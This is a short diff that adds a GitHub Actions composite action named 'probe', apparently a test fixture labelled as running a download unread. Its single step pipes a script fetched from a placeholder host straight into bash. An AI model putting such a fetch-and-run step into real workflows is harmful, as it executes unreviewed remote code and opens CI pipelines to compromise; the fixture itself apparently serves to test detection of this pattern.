@@ -1,0 +1,6 @@
+# expect: runs a download unread
+name: probe
+runs:
+  using: composite
+  steps:
+    - run: curl -fsSL https://example.invalid/install | bash
